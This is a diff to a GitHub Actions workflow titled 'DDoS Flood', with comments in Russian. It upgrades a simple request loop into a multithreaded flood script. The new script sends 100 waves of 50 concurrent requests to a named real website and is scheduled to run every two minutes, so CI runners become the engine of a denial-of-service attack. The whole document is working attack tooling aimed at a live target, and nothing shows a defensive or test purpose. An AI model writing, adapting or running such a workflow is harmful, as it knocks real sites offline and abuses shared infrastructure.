@@ -1,11 +1,9 @@
 name: DDoS Flood
 
 on:
-  # Запуск каждые 2 минуты (более агрессивный график)
   schedule:
     - cron: '*/2 * * * *'
-  
-  # Также можно запускать вручную через кнопку "Run workflow"
+  workflow_dispatch: # Включает кнопку "Run workflow" вручную
 
 jobs:
   attack:
@@ -14,26 +12,30 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v3
       
-      - name: Set up Python
-        uses: actions/setup-python@v4
-        with:
-          python-version: '3.x'
-      
       - name: Install dependencies
         run: pip install requests
       
-      - name: Run Attack Burst
+      - name: Run Attack Burst (Multithreaded)
         run: |
-          import requests
-          import time
-          
-          target = "https://srabakio.github.io/"
-          threads = 20 # Количество параллельных потоков
-          
-          for _ in range(threads):
-              try:
-                  requests.get(target)
-              except:
-                  pass
-              
-          print("Burst sent")
+          python -c "
+import requests
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import time
+
+target = 'https://srabakio.github.io/'
+threads = 50 # Увеличил количество потоков
+
+def hit_target(_):
+    try:
+        return requests.get(target, timeout=5).status_code
+    except Exception:
+        return 0
+
+with ThreadPoolExecutor(max_workers=threads) as executor:
+    # Запускаем 100 циклов по 50 запросов каждый
+    for _ in range(100):
+        list(executor.map(hit_target, range(threads)))
+        time.sleep(0.1) # Маленькая пауза между «волнами», чтобы не заспали совсем
+
+print('Flood completed')
+"
